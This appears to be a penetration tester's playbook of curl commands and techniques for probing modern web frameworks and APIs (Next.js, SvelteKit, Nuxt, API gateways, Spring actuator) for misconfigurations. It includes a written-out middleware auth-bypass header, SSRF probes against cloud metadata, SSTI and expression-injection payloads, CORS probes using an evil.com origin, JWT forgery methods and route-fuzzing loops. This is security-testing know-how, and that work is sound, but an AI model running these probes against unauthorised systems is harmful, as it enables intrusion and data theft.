# Moraa — Modern framework & API misconfiguration test cases

> Load when a target is a modern SPA (Next.js/SvelteKit/React/Angular/Vue) or an API gateway /
> microservice mesh. These are the highest-yield "new stack" bugs in 2025-26. Commands first.
> Distilled from real engagements (acme.example, Fetch, saasvendor.example) — the lessons are inline.

---

## 0. Fingerprint the stack first (decides which tests apply)

```bash
curl -sk https://T/ -D- -o body.html
grep -oiE '/_next/|__NEXT_DATA__|/_nuxt/|__NUXT__|/_app/immutable/|__sveltekit|ng-version|data-reactroot|/assets/index-[A-Za-z0-9_-]+\.js|webpackChunk' body.html
# headers that leak framework/host
grep -iE 'x-powered-by|server:|x-vercel|x-nextjs|x-amz|x-amzn|via:|x-envoy|x-kong|x-middleware' -r headers
```
| Signal | Stack | Jump to |
|---|---|---|
| `/_next/`, `__NEXT_DATA__`, `x-nextjs-*` | **Next.js** | §1 |
| `__sveltekit`, `/_app/immutable/`, `__data.json` | **SvelteKit** | §2 |
| `/assets/index-*.js` + Vite, `ng-version`, `webpackChunk` | **SPA (React/Vue/Angular)** | §3 |
| `{"message":"Missing Authentication Token"}` | **AWS API Gateway** | §4 |
| `X-Kong/Envoy/Apigee`, `awselb/2.0` | **Gateway/mesh** | §4 |
| Spring `Whitelabel`, `/actuator` | **Spring Boot** | §5 |
| Werkzeug 404 / Fastify `"Route ... not found"` | **Flask / Fastify** | §5 |

---

## 1. Next.js (the current goldmine)

```bash
# AUTH BYPASS — CVE-2025-29927: skip middleware (auth/redirect) with a forged header
curl -sk https://T/admin -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'
#   also try values: 'pages/_middleware' , 'src/middleware' , 'middleware'  (path depends on version)
#   if a page/API normally gated by middleware now returns 200 → auth bypass. HIGH/CRIT.

# DATA/PROP LEAK — server props are shipped to the client
curl -sk 'https://T/_next/data/<BUILD_ID>/<page>.json'      # BUILD_ID from __NEXT_DATA__ or buildManifest
#   getServerSideProps output for ANY page incl authed ones — often leaks PII/config not shown in UI

# route/asset manifests → hidden routes + build id
curl -sk https://T/_next/static/<BUILD_ID>/_buildManifest.js
curl -sk https://T/_next/static/<BUILD_ID>/_ssgManifest.js
# RSC (app router) — fetch server components directly, bypassing client gates
curl -sk 'https://T/some/page?_rsc=1' -H 'RSC: 1' -H 'Next-Router-State-Tree: %5B...%5D'
# image optimizer SSRF / DoS
curl -sk 'https://T/_next/image?url=http://169.254.169.254/&w=64&q=1'   # if allowlist weak → SSRF
curl -sk 'https://T/_next/image?url=/&w=99999&q=100'                    # resource exhaustion
```

`_buildManifest.js` → `sortedPages` is the **complete** route list for a pages-router app, API
routes included. Don't ffuf a Next.js pages app before reading it — it hands you every
`/api/...` route and every `[param]` segment for free, including ones with no UI.

### 1b. The BFF→headless-CMS proxy pattern (Strapi/Contentful/Sanity/Directus behind Next `/api/*`)

Very common shape: the CMS is firewalled (WAF/IP-allowlist) and the only way in is a handful of
Next.js API routes that proxy to it **using a privileged server-side CMS token**. That token is the
prize — every route that touches it is a potential confused deputy. Fingerprints: upload URLs like
`cdn.<app>/Name_<10-hex>.png` (Strapi), a `documentId` of exactly 24 lowercase alphanumerics
(**Strapi v5**), `relation: "api::article.article:<documentId>"` in the client bundle,
`frame-ancestors` in the CSP listing the CMS host (that's the CMS's live-preview iframe).

Run this battery against every proxy route — one variable at a time:

```bash
# 0) method enumeration FIRST — 405 vs 400 vs 401 maps the route without touching data
for m in GET POST PUT PATCH DELETE; do
  printf '%s ' "$m"; curl -s -o /dev/null -w '%{http_code}\n' -X $m "https://T/api/<route>/<id>"; done

# 1) path traversal in the dynamic segment → reach other CMS collections with the privileged token
curl -s "https://T/api/comments/..%2fusers"      # also %2e%2e%2f , double-encode ..%252f
#    a strict 24-char [a-z0-9] regex on the segment kills this — check with a 25-char id (400 = validated)

# 2) query passthrough → CMS query-language injection (Strapi: populate/fields/filters/sort)
#    if these change the response, you can pull relations the UI never shows (author email, drafts)
curl -s "https://T/api/comments/$ID?populate=*"
curl -s "https://T/api/comments/$ID?populate[author][fields][0]=email"
curl -s "https://T/api/comments/$ID?pagination[pageSize]=100"

# 3) mass assignment — does the route forward your whole `data`/body object to the CMS?
#    unknown field -> 503/500 = forwarded & rejected by CMS SCHEMA (not by the app!) = passthrough confirmed
#    then probe real CMS fields: publishedAt(null)=unpublish, <relation>(null)=orphan, locale, id, documentId
curl -s -X PUT "https://T/api/statistics/$ID" -H 'Content-Type: application/json' \
  -d '{"data":{"upvotes":1,"downvotes":1,"zzzprobe":"x"}}'

# 4) auth gap per route — the write routes are the ones people forget
for ck in "" "Cookie: $SESSION"; do curl -s -o /dev/null -w "%{http_code}\n" -X PUT ... ; done
```

Read the **client** call-site in the bundle before testing — it gives you the exact param contract
and often exposes the bug by itself. Two patterns to grep for:

- **Client-side-only authz.** e.g. `if (me !== c.author.id) throw Error("not authorized")` and then
  `DELETE /api/comments/delete/${doc}?commentId=${c.id}&authorId=${c.author.id}` — the identity is a
  **query param the attacker sets**. Always replay it with a victim's `authorId` (public in the
  comments GET). Server-side it must compare to the session; if it 403s ("you can only delete your
  own"), it's enforced — but a huge number of these aren't.
- **Client-supplied identity in a create DTO.** e.g. `{content, author:{id,name,email,avatar}, ...}`.
  If the server doesn't overwrite `author` from the session JWT you get free identity spoofing
  (post as "the vendor Support") on a public brand property. Test by sending a bogus
  `author.name`/`email`/`avatar` **with your own `author.id`** so you can still delete the record
  afterwards — then diff the echoed response against what you sent.
  Same request doubles as a mass-assignment probe: add `isAdminComment:true`, `approvalStatus`,
  `blocked:false`. A privileged flag that survives = staff impersonation, and on sanitiser-per-role
  designs it also unlocks a wider HTML allowlist (`<a href>`) → phishing.

Non-obvious: **client-side `sanitize-html` at render can be the real XSS control.** If the render is
`dangerouslySetInnerHTML:{__html: sanitizeHtml(content, cfg)}` with `allowedAttributes:{}`, stored
HTML is neutralised at display time no matter what the server stored — don't burn hours on stored
XSS there. Extract the `allowedTags`/`allowedAttributes` config from the bundle first and decide.

### 1c. Cache-poisoning chains (Next.js internal cache layer — PortSwigger Research Top 10 2025
#7, Rachid Allam/zhero)

Distinct from classic unkeyed-input web-cache-poisoning (`web-cache.md`'s territory — an
edge/CDN cache keying bug). This is Next.js's **own internal Full Route Cache / Data Cache /
Router Cache** (the framework's built-in caching layer, App Router `fetch()` caching and ISR/
on-demand revalidation) misbehaving in ways specific to its implementation, not a generic CDN
cache-key gap. Source-driven, framework-internals research — read the write-up before hunting
this live, the exact vulnerable pattern is version/config-dependent:
```bash
# fingerprint which cache mode is active first
curl -sk -D- https://T/some/page -o /dev/null | grep -iE 'x-nextjs-cache|x-vercel-cache|cache-control'
#   HIT/MISS/STALE in x-nextjs-cache or x-vercel-cache confirms the internal cache is live

# on-demand revalidation endpoints are a common entry point if exposed without auth
curl -sk "https://T/api/revalidate?path=/some/page&secret=GUESS"
#   an unauthenticated or weakly-secreted revalidate route lets an attacker force cache
#   invalidation/repopulation on a timed basis — pairs with a poisoned response to make the
#   poison persistent instead of a one-shot race

# ISR (Incremental Static Regeneration) race: request a stale/regenerating page with attacker-
# controlled headers/cookies during the regeneration window — if the framework caches the
# regenerated response WITHOUT properly varying on the input that changed it, every subsequent
# visitor gets your poisoned response until the next revalidation
```
Chain-worthiness: on its own, a cached poisoned response is a stored-content-injection bug scoped
to however many visitors hit the cache before it clears — the severity comes from WHAT gets
poisoned (a personalized/authenticated response leaking to anonymous visitors is far worse than a
poisoned marketing page). Read `zhero`'s write-up for the exact internal-cache-key derivation bug
before claiming this class on a target; it's implementation-specific enough that a generic probe
won't reliably reproduce it. Reference: https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir

## 2. SvelteKit (under-tested, high hit-rate — saasvendor.example class)

```bash
# __data.json exposes the load() output for a route — INCLUDING server load() with secrets
curl -sk 'https://T/__data.json'
curl -sk 'https://T/<route>/__data.json'      # e.g. /account/__data.json, /api-keys/__data.json
#   Lesson: unauth __data.json leaked backend authHeader + config + PII across tenants. CONFIRMED HIGH.
#   Sweep every route you can enumerate; server load() often returns data the UI never renders.
# also try the endpoint suffix .json and trailing-slash variants
curl -sk 'https://T/<route>/'  vs  'https://T/<route>'   # SK route normalization/redirect quirks
```

## 2b. Nuxt.js (Vue SSR — `/_nuxt/`, `__NUXT__`)

```bash
# fingerprint
curl -sk https://T/ | grep -oiE '/_nuxt/|window.__NUXT__|__NUXT_DATA__|_payload.json'
# server payload — Nuxt3 ships route data (incl server-fetched) as a payload; can leak props/secrets
curl -sk 'https://T/_payload.json'   ;  curl -sk 'https://T/<route>/_payload.json'
curl -sk 'https://T/api/_content/...'                  # @nuxt/content exposes content API
# Nitro server routes (Nuxt3 backend) — enumerate /api/* ; often the real backend, same-origin
grep -rhoiE '/api/[A-Za-z0-9/_.-]{2,50}' _nuxt-bundle.js | sort -u
# runtimeConfig leak: public keys in __NUXT__.config.public ; check for PRIVATE keys accidentally in public
curl -sk https://T/ | grep -oiE '"config":\{.*?\}' | head
# known: SSRF/LFI in Nuxt image (@nuxt/image) ?url= ; devtools endpoint exposed (/_nuxt/... in prod)
curl -sk 'https://T/_ipx/_/http://169.254.169.254/'    # @nuxt/image IPX SSRF probe
```
> Nuxt `useFetch/useAsyncData` results are serialized into `__NUXT__`/`_payload.json` and shipped to
> the client — server-only data can leak there (same idea as SvelteKit `__data.json` / Next `_next/data`).

## 3. Generic SPA (React/Vue/Angular, Vite/CRA/Webpack) — mine the bundle, it always leaks

```bash
# 1) source maps → full source, internal endpoints, comments, secrets
for js in $(grep -oiE '/(assets|static)/[A-Za-z0-9_./-]+\.js' body.html); do
  curl -sk "https://T$js.map" -o "$(basename $js).map" -w '%{http_code} '$js.map'\n'; done
#   Lesson (Fetch): *.js.map leaked 163-253 internal admin endpoints + SDK. CWE-540. Medium+ on its own.
# 2) even minified: extract hosts, endpoints, keys, feature flags, runtime config
cat *.js | grep -oiE 'https?://[a-z0-9.-]+\.(TARGET1|TARGET2)\.[a-z]+' | sort -u   # backend hosts
cat *.js | grep -oiE '/(api|v1|v2|graphql|rest)/[A-Za-z0-9/_.${}:-]{2,60}' | sort -u
cat *.js | grep -oiE '(REACT_APP_[A-Z_]+|VITE_[A-Z_]+|NG_[A-Z_]+)"?:"?[^",}]{0,80}'  # runtime env — API base, client_id, Stripe, Maps key
cat *.js | grep -oiE '(client_id|clientId|api[_-]?key|apiKey|AKIA[A-Z0-9]{16}|pk_live|sk_live|AIza[0-9A-Za-z_-]{35}|xox[baprs]-)[^",} ]{0,40}'
# 3) runtime config files SPAs fetch at boot
for c in config.json environment.json assets/config.json app-config.json /config /api/config; do
  curl -sk "https://T/$c" -w ' %{http_code} '$c'\n' -o -; done
```
> The frontend host is usually just static; the **real backend + its full route list live in the
> bundle**. Mining JS is step 1 of every SPA engagement. Google Maps/API keys → check for
> unrestricted-key billing abuse. Stripe `pk_live` alone = low; `sk_`/restricted keys = high.

## 4. API Gateway / microservice mesh

```bash
# AWS API Gateway: "Missing Authentication Token" = UNMATCHED ROUTE (not necessarily auth) — enumerate paths
#   you must know exact routes; mine them from the consuming frontend/mobile app, not by guessing.
# API-GW quirks:
curl -sk https://api-gw/prod/… ; try stage names: /prod /dev /stage /v1 /v2 /internal
curl -sk https://T/ -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Forwarded-Host: evil'   # trust-header spoof
# Identity/impersonation headers backends wrongly trust (test on gated endpoints):
X-Forwarded-Email / X-Auth-Request-Email / X-User-Email / X-User-Id / X-Admin-Target /
Cf-Access-Authenticated-User-Email / X-Forwarded-User / X-Consumer-Username / X-Remote-User
#   Lesson (acme.example): X-Admin-Target existed & was correctly 403'd — but this header CLASS is where
#   privesc lives. Always try setting the identity header the backend expects from its proxy.
```

## 5. Server frameworks — actuator/debug/console

```bash
# Spring Boot actuator (auth often only on the gateway, open on the pod/internal)
for p in actuator actuator/env actuator/health actuator/mappings actuator/heapdump \
         actuator/threaddump actuator/loggers env mappings heapdump jolokia; do
  curl -sk "https://T/$p" -w ' %{http_code} '$p'\n' -o /tmp/o; done
#   /actuator/env → creds in props; /heapdump → download & strings for secrets/tokens; jolokia → RCE
# Spring SpEL/expression: `${7*7}` `#{7*7}` `T(java.lang.Runtime)` in name/search/header inputs
# Flask/Werkzeug: /console (debug PIN), SSTI `{{7*7}}` `{{config}}` `{{self.__init__.__globals__}}`
# Fastify/Express: verbose stack in 500; try trailing-slash & method override (X-HTTP-Method-Override)
# GraphQL: introspection, /graphql /graphiql /v1/graphql; batching; field-level authz on node()
# generic: /swagger /openapi.json /api-docs /.env /debug /metrics /health/detailed  (map, don't assume)
```

## 6. CORS / CSRF / cookie misconfig (test on EVERY API)

```bash
# CORS: credentialed + reflected/wildcard origin = cross-site data theft
curl -sk https://T/api/me -H 'Origin: https://evil.com' -D- -o/dev/null | grep -i 'access-control-'
#   WIN = Access-Control-Allow-Origin: https://evil.com  AND  -Allow-Credentials: true
#   also test: Origin: null , https://T.evil.com , https://evilT.com (suffix/prefix regex flaws)
#   Lesson (Fetch): credentialed wildcard CORS gated by SameSite=Lax → needs *.target XSS/subdomain
#   takeover to weaponize; Domain=.target cookie amplifies. Rate it with that precondition in mind.
# CSRF "protection" that is just a STATIC header presence check (no per-session token):
#   e.g. `X-App-CSRF-Protection: 1` — any client that can set headers passes it. Note as weak defense,
#   NOT a finding by itself; but it means state-changing POSTs are reachable once CORS/XSS is solved.
# Cookies: check SameSite (None=cross-site usable), Domain=.parent (shared across subdomains = blast
#   radius), Secure/HttpOnly, and CROSS-DOMAIN acceptance (acme.example cookie was honored by acme-legacy.example API —
#   federation; means one stolen session reaches many backends).
```

## 7. Authorization testing methodology (how to READ the responses)

The status code tells you where the request died — use it to find the gap:
```
401  → no/invalid auth (auth layer)          403 "PermissionDenied Need role=admin" → RBAC gate present
403 "CSRF ... missing"  → CSRF layer (add the header, retry)   403 app-level "forbidden" → OWNERSHIP gate
400  validation error  → you passed authz, hit input validation  ← IMPORTANT
404 "not found" (app)  → passed authz, object missing (ownership-scoped 404 is GOOD design)
200 / data             → reached the resource
```
- **Validation-before-authz trap (acme.example lesson):** a malformed id gives `400` *before* the role check runs. Don't call that an authz bypass — resend a **valid-format** value; if it then `403`s, authz is enforced. Only `200/valid-data` on a foreign object is IDOR.
- **Fake-id probe:** hit an action endpoint with a well-formed, nonexistent id. `403`=ownership pre-check; `404`=passed authz (needs a real foreign id to prove IDOR); never run destructive actions on real foreign ids.
- **Two-account truth test:** the only clean IDOR proof — A creates/owns object, B (its session) reads/updates/deletes it. Both accounts must be yours.
- **Info leak in errors:** frameworks that echo the permission model (`Need(method='role', value='admin')`) or return `500` for authz denials are a minor disclosure — note as low/info, and use it as a map of what roles/endpoints exist.
- **Persona/tenant gating (LLM & multi-tenant):** a create call refused with "requires a @X account" is server-side identity gating — try to bypass via the identity headers in §4 before concluding it's solid.
- **Malformed-JSON auth-gate oracle (NMS-appliance lesson) — map auth on DANGEROUS write routes without ever firing them.** Hapi/Express/Fastify run the auth strategy *before* payload parsing. POST an unparseable body (literally `{`):
  ```bash
  curl -s -X POST -H 'Content-Type: application/json' --data-binary '{' https://t/api/v1/dangerous-write
  # 401 "Missing authentication"              -> route IS behind the auth strategy
  # 400 "Invalid request payload JSON format" -> route is OUTSIDE auth, and the handler NEVER ran
  ```
  The handler cannot execute because the body never parses — so you can audit `/setup`, `/restore`, `/reset`, `/import` style endpoints on live production safely. Always run 3-4 known-gated controls first to prove the ordering on that app. This found `POST /nms/setup/finish` on a prod the NMS appliance console (unauth, and absent from the 35 MB JS bundle — server-only routes are invisible to bundle-derived sweeps, so brute a name list too).
- **Credential NAME-vs-VALUE oracle (enterprise-identity lesson) — map a *new* cell's auth scheme with zero valid credentials.** Many gateways distinguish "no credential present" from "credential present but bad": `{"msg":"The access token is missing"}` vs `{"msg":"Invalid access token"}`. Replay a **stale/expired** token under each candidate cookie name and read which error you get:
  ```bash
  curl -s https://api-gw.tenant.ent.acme.example/ent/api/account/info -H 'Cookie: tenant_auth_cloud=<stale>'
  #  -> "Invalid access token"        => this cookie NAME is the real one (value merely rejected)
  curl -s https://api-gw.tenant.ent.acme.example/ent/api/account/info -H 'Cookie: ent_tenant_auth_cloud=<same>'
  #  -> "The access token is missing" => wrong NAME, gateway never saw a credential
  ```
  That single split tells you the cookie name, whether cookie-only auth is accepted (vs `Authorization: Bearer` only), and whether a sibling environment reuses the same names — all without a login. Feed it straight into the CORS `SameSite` question (`cors.md` §2b/§4) and into session-transfer tests across a cell fleet.
- **Enumerating a Joi/Hapi schema without risking a valid submission:** `abortEarly:true` is the default (`?abortEarly=false`, `Prefer:`, `X-Debug:` are almost never honoured — try them first anyway, zero cost). Walk it one field at a time: type-satisfy the fields already discovered, keep the next one **wrong-typed** (number/array where a string is wanted). Optional fields are still type-checked when present, so a wrong-typed field is a reliable guaranteed-400 blocker. Errors come in schema order, `required` before unknown-key. **Stop one field short of a complete body** — on a first-run/setup wizard the complete body IS the exploit. Joi leaks generously: `"x" must be one of [string]`, `"user.email" must be a valid email`, and enums dump the entire allowed list (an NMS-appliance console returned the whole 9.7 KB IANA timezone list unauthenticated).

## 8. Signed-request / token forgery (client-side secret)

```
?url=…&time=…&digest=…  or  Authorization: <HMAC>  computed IN the browser/worker bundle
→ if the signing key/algorithm is in the JS (grep 'hmac|createHmac|sign|secret|digest'), you can
  forge arbitrary signed requests (SSRF/log-injection/telemetry-injection). OTLP-collector class.
JWT: alg:none, RS256→HS256 confusion (sign with public key as HMAC secret), weak HS256 secret
  (hashcat -m 16500), kid path traversal / SQLi, jku/jwk header pointing to attacker key.
```

---

## Cloudflare Worker route oracle — `1101` vs `404` vs SPA fallback

A Worker-backed SPA looks like a black box: every unknown path returns `200 <index.html>`, so
ordinary content fuzzing finds nothing. But most hand-rolled Worker routers **throw** on an
unmatched `(path, method)` pair instead of returning 404, and Cloudflare turns an uncaught Worker
exception into `HTTP 500  error code: 1101`. That gives three distinguishable states and an exact,
method-aware route table — no guessing, no wordlist luck:

| Response | Meaning |
|---|---|
| `500 error code: 1101` | route does **not** exist for that method (Worker threw) |
| app's own error, e.g. `404 not found` / `401 unauthorized` | route **exists**, handler ran |
| `200 <index.html>` (fixed byte size) | SPA catch-all — not an API route at all |

```bash
# control first — prove 1101 means "unmatched" on THIS target
curl -s -o /dev/null -w '%{http_code} ' -X PUT  https://host/api/thing/zzzznotaroute   # expect 1101
curl -s -o /dev/null -w '%{http_code} ' -X GET  https://host/api/thing/realsubroute    # expect 404/401

# then enumerate by method, filtering both 1101 and the SPA body size
for M in GET POST PUT PATCH DELETE; do
  for W in $(cat words.txt); do
    r=$(curl -s -m 12 -o /tmp/o -w "%{http_code} %{size_download}" -X $M \
        -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0' \
        -H "Cookie: $SESSION" -H 'Content-Type: application/json' -d '{}' \
        "https://host/api/thing/$W")
    case "$r" in *" $SPA_SIZE"|*"500 17") ;; *) echo "$M /api/thing/$W  $r $(head -c 90 /tmp/o)";; esac
  done
done
```

**Why it pays.** The client bundle only shows the routes the *current* UI calls. This oracle
surfaces the ones it does not — typically the destructive and write-side ones
(`DELETE /x/{id}`, `POST /x/{id}/messages`, `POST /x/{id}/title`). Those are exactly where an
authorization check tends to be missing, because the team only hardened the route the UI exercises.
Proven on the vendor's `*.proto.agents.stg.acme.example` fleet (2026-09-26): the bundle exposed 6 routes,
the oracle found 11, and the 5 extra ones were all undocumented writes.

**Two traps:**
1. **Python `urllib` / `requests` default User-Agent trips Cloudflare `error code: 1010`** and every
   result becomes a false "blocked". Always send a browser UA when fuzzing behind Cloudflare —
   `curl`'s default UA passes where `Python-urllib/3.x` does not.
2. The SPA fallback body size can differ per path depth (e.g. 383 B at `/api/x`, 750 B at
   `/api/x/y/z` when the HTML contains relative asset paths). Re-measure the fallback size for each
   path template rather than hard-coding one number.

### Companion check: is the block path-scoped?
When one host in a fleet is "locked" with a `403`, test the **API prefix separately from the UI
paths** before believing it. A block bolted on at the edge is often written against the UI routes
only and misses `/api/*`:

```
GET /            -> 403 forbidden
GET /index.html  -> 403 forbidden
GET /api         -> 403 forbidden
GET /api/chats   -> 200 {...}          <-- the whole API is still reachable
```

That is a reportable access-control failure on its own terms — the owner's intent to close the host
is explicit, and the API contradicts it. Compare against a sibling host that blocks correctly
(uniform 403 on every path *and* against ~15 header-spoof bypasses) to show the fleet has a working
control that this host simply isn't using.

---

## Offline container source review — read a whole API's auth posture with zero prod traffic

When a target 401-gates most of its API and you cannot get an account, stop guessing from status
codes: **pull the vendor's own container image and read the route table.** Self-hosted/appliance
products (the NMS appliance, GitLab, Mattermost, Zammad, Nextcloud, most network appliances) publish the
exact production build to a registry.

**No Docker and no root required** — `crane` pulls and flattens an image as an unprivileged user:

```bash
go install github.com/google/go-containerregistry/cmd/crane@latest
crane ls  vendor/product                       # find the tag matching the fingerprinted prod version
crane export --platform linux/amd64 vendor/product:1.2.3 img.tar
mkdir rootfs && tar -xf img.tar -C rootfs
```

### Enumerate the auth posture of every route
Modern builds bundle the whole server into one big JS file. Regex the route declarations and
classify the options blob — minified `auth:!1` **is** `auth:false`:

```bash
# every route + its auth setting
grep -oE 'method:"[A-Z]+",path:"/[^"]+".{0,600}' api.js
```

Bucket into: `auth:false` · `auth:{scope:[...]}` · no `auth:` key (inherits the server default).
On the NMS appliance 3.0.159 that gave 283 routes = 269 scoped / 11 unauthenticated / 3 other, in seconds.

### Then apply these three rules — each one saved a false positive on a real engagement

1. **`auth:false` is a LEAD, never a finding. Read the handler.** the NMS appliance's
   `POST /vault/credentials/unlock` is declared `auth:!1` right next to SUPERADMIN-scoped siblings —
   it looks like a textbook missing gate. The handler then reads `x-auth-token`, tries
   `validateVaultToken`, falls back to `validateApiToken`, and enforces `[CLOUD,SUPERADMIN,ADMIN]`
   scope. Route-level auth was disabled *so the handler could accept two different token types*.
   That is a legitimate and common pattern.

2. **Grep the bootstrap for conditional plugin registration before you get excited.** the NMS appliance ships a
   complete unauthenticated backdoor group — `/nms/e2e/{aes-keys,vault-passphrase,reset,restart,
   setup}`, all `auth:!1`, including one route that hands out the credential-vault passphrase and one
   that creates a user. Critical *if* it loaded. It doesn't:
   ```js
   N.isTest && n.push({ plugin: (await import('./e2e')).default, options:{model:br} });
   ```
   Always search for `isTest &&`, `NODE_ENV !== 'production'`, `config.debug &&` around the plugin
   list. **Conversely: re-check that gate on every new version — it is one typo away from Critical.**

3. **Read validation as *parsed* vs *substring*.** The SSRF candidate
   `GET sites/nominatim/proxy?apiurl=` turned out safe because it compares the **parsed hostname**
   exactly: `if (new URL(r).hostname !== "nominatim.openstreetmap.org") throw badRequest()`.
   A substring/`startsWith`/`includes` check on the raw URL would have been bypassable
   (`https://nominatim.openstreetmap.org.attacker.tld/`), and `new URL().hostname` also neutralises
   the userinfo `@` trick. This one line is the difference between SSRF and no SSRF — find it before
   you spend an afternoon fuzzing the parameter.

### Ordering / fail-closed check on auth endpoints
While you have the source, verify rate-limit ordering on login and 2FA rather than probing prod:
the NMS appliance's TOTP step-2 calls `addAttemptForLogin()` **before** verifying the 6-digit code and only clears
it via `userLoginSuccess()` on success, with the counter header added in a `finally` — fail-closed,
so no 2FA brute-force. Code answers this definitively; black-box probing of a lockout is noisy,
slow, and risks locking a real account.

**Discipline:** vendor source proves the **code path**, not that production runs that build or that
no edge/WAF sits in front. Fingerprint the prod version first, pin the identical tag, and re-verify
anything you find with a safe read-only probe against production before writing it up.

---

## A SPA's custom request header can be part of the CREDENTIAL — check before trusting any 401

**Where it bit:** `designer.svc.acme.example` (the vendor's design API), 2026-10-01. Cost: two complete
admin-plane sweeps, both of which reported the entire application as `401` and would have been filed
as a clean negative.

The app's fetch wrapper (recovered from the minified bundle) sends:

```js
fetch(url, { method, credentials: 'include',
  headers: new Headers({ 'Content-Type': 'application/json',
                         'X-App-Build': CONFIG.BUILD,     // <-- load-bearing
                         'SocketId': socket.id }) })
```

With a valid session cookie but **without** `X-App-Build`, every authenticated route answers:

```
401 {"error":{"type":"authorization","code":"errors.user.access","message":"User not authenticated"}}
```

With the header, the same requests return 200. The header is not a CSRF token and not documented
anywhere; the middleware simply treats a request with no/stale build as unauthenticated (probably a
forced-reload mechanism — the response also carries `X-Build`, and the client reloads when the server
build is newer).

### Why this is a *trap* and not just a quirk
`GET /user/me` answers **200 with the real account** either way. So the obvious sanity check —
"is my session alive? yes, /user/me returns my email" — passes, and then the rest of the app looks
uniformly locked down. That is a manufactured clean negative.

### The check, every time, on any SPA-backed API
1. Pull the bundle's HTTP client and list **every** header it sets unconditionally
   (`grep -ohE 'new Headers\(\{[^}]*\}' *.js`). Treat each as potentially part of the credential.
2. Establish the oracle on a route you know should work: fire it **with** and **without** each
   custom header and diff. If a header flips 401 -> 200, it is a credential component — put it in
   the harness before any sweep.
3. Re-baseline whenever the app's build/version value changes; a stale value can behave like a
   missing one.
4. Bonus: a build/version header that gates auth is also a **soft DoS / forced-logout** primitive to
   consider — anything that can make the client send a stale value logs the user out.

### Related gotcha on the same host — short-lived server-side token behind a long-lived session
The express-session cookie lasts 30 days, but the SSO access token stored *inside* the session
expires in minutes. After expiry, `/user/me` keeps serving the cached session user while every
token-validating route starts returning the same `401 "User not authenticated"`. Re-run the OAuth
login immediately before each batch, and never conclude "route X is gated" from a batch that ran
more than a couple of minutes after login.

### And read the error dialect, not the status code
All four of this app's gates return `401` or `403`, and the wording is actively misleading:

| message | gate that actually fired |
|---|---|
| `"User not authenticated"` | **admin-only** gate (not an auth failure at all) |
| `"User doesn't have access"` | non-admin role / entitlement gate |
| `errors.project.access` "No access to project" | per-object membership gate |
| `errors.user.tempUserNotAllowed` | anonymous/temp-account gate |

Mapping the dialect once, against routes whose required role you already know from the bundle, is
faster and far more reliable than status-code triage.

---

## 7b. Two more status codes that are NOT authz answers (both cost real time)

Addendum to §7, from a gateway where every response was HTTP 200 and the verdict sat in a JSON
`code`. Two codes get misread as authz verdicts when they are nothing of the kind:

**`405 Method Not Allowed` is a ROUTING answer, returned before authz runs.** A `GET` against a
POST-only route returns 405 to *every* caller — anonymous, low-priv, admin alike. The highest-value
route on that engagement (`/gw/authn/api/v1/admin/token_exchange`, a portal→admin token exchange)
returned 405 to a low-priv `GET`, which reads like "reachable, no gate". It means nothing. Re-send
with the **correct method** before recording any verdict:

```bash
./probe.sh member GET  /gw/authn/api/v1/admin/token_exchange   # -> 405, tells you NOTHING
./probe.sh member POST /gw/authn/api/v1/admin/token_exchange '{}'   # -> the real answer
```

**A route group whose ABSENT routes return a 401/403 has authz before routing** — so a denial there
is not evidence the route exists. Probe a definitely-absent path in that group first; if it denies
you too, you have no existence oracle in that subtree and route enumeration is pure noise.

### The by-id/list asymmetry — hunt this deliberately
The pattern that repeated across four services on that target: **the list route is gated and the
by-id route is not.** Teams put the permission decorator on `GET /thing/list` (it is the one in the
UI) and forget `GET /thing?unique_id=<uuid>` or `GET /thing/{id}`.

So for every gated list route, find and test its by-id sibling, and read the result with §7's
ownership-404 rule plus one extra control:

| low-priv result on the by-id route | privileged result on the SAME id | reading |
|---|---|---|
| `403` / permission name | — | gated, no bug |
| `NOT_FOUND` | **also `NOT_FOUND`** | wrong id namespace. **No bug** — this is the #1 false positive |
| `NOT_FOUND` | **reads the object** | **authz gap.** Low-priv passed the gate and was stopped only by not knowing an id — now it is a key-discovery problem, not an authz one |
| data | data | confirmed broken access control |

The last row is the finding; the third row is the *lead* worth chasing, because identifiers leak
constantly from notification feeds, activity logs and search endpoints. See
[[idor-access-control]] for the two-account discipline and [[signed-url-mints]] for the variant
where the ungated sibling hands out a media credential instead of the data.

---

## Vendor package index: get the server-side code without a device (`fw-update`-style firmware APIs)

**When:** the bug is in an appliance/IoT vendor's *device-side* client — the auth scheme, the id
minting, the signing logic — and you cannot authenticate to the cloud API because you do not own the
hardware. Also whenever a host 401/403-gates a device plane and you have no credential to sample it
with.

**The move:** stop guessing at package CDNs. Many vendors publish a **listable, anonymous firmware /
application package index**. A list beats a key-existence oracle every time — it gives you versions,
platforms, channels, sizes, hashes and direct download hrefs with no authentication.

Proven on the vendor, 2026-10-14 (`acme.example` engagement, r4 one shard). It turned a hard blocker
("we need a camera NVR") into a recovered auth scheme in under an hour, after two prior lanes
had closed every network route:

```bash
# 1. Index. HAL+JSON, anonymous, no referer check. Filter syntax is eq~~<field>~~<value>.
curl -sS 'https://fw-update.acme-legacy.example/api/firmware?filter=eq~~product~~acme-protect&limit=500'
curl -sS 'https://fw-update.acme-legacy.example/api/firmware-latest?filter=eq~~product~~<product>'
#    each entry: version / version_major|minor|patch / platform / channel (release|beta-public)
#                created / file_size / md5 / sha256_checksum
#                _links.data.href      -> https://fw-download.acme-legacy.example/data/<product>/<...>.deb|.bin
#                _links.changelog.href -> changelog for that exact build

# 2. Download, verify against the index's own file_size/sha256 (this is your authenticity control).
curl -sSL -o pkg.deb '<_links.data.href>'
stat -c %s pkg.deb && sha256sum pkg.deb

# 3. Read the control metadata FIRST - its Depends: line names the sibling packages,
#    which is how you find the component you actually want.
dpkg-deb --info pkg.deb
dpkg-deb -x pkg.deb ./x/          # extract into its own new, empty directory
```

**Step 3 is the step people skip, and it is the one that paid.** The `acme-protect` package's
`Depends:` line named `protect-verify (>= 2.0.0)` — a separate 425 KB package that *was* the evidence
signer, downloadable by the same method. Dependency lines are a free component map of the whole
device-side stack: `acme-core`, `ds`, `msf`, `ai-feature-controller`, `acme-rclone`, each queryable
as its own `product` in the index.

**Then grep the extracted app for the cloud hostnames you have been probing.** The package ships its
own environment map, which confirms you are reading the code behind the exact host under test:

```bash
grep -rl '<cloud-host-you-are-probing>' x/        # -> app/config/default.json
